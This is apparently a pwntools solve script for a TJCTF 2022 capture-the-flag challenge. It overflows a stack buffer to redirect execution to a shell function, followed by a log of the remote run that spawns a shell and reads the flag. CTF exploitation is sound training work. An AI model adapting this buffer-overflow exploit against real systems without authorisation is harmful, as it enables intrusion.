from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './chall'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "tjc.tf"
  PORT = 31680
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

ret_addr = 0x40101a # ret; 

s.recvuntil("Where am I going today?\n")

s.sendline("A"*24+p64(ret_addr)+p64(elf.sym.shell_land))

s.interactive()

'''
mito@ubuntu:~/CTF/TJCTF_2022/Pwn_vacation-1$ python solve.py r
[*] '/home/mito/CTF/TJCTF_2022/Pwn_vacation-1/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to tjc.tf on port 31680: Done
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 24
-rw-rw-rw- 1 nobody nogroup    50 Apr 21 14:09 flag.txt
-rwxrwxrwx 1 nobody nogroup 16936 Apr 21 14:09 run
$ cat flag.txt
tjctf{wh4t_a_n1c3_plac3_ind33d!_7609d40aeba4844c}
'''
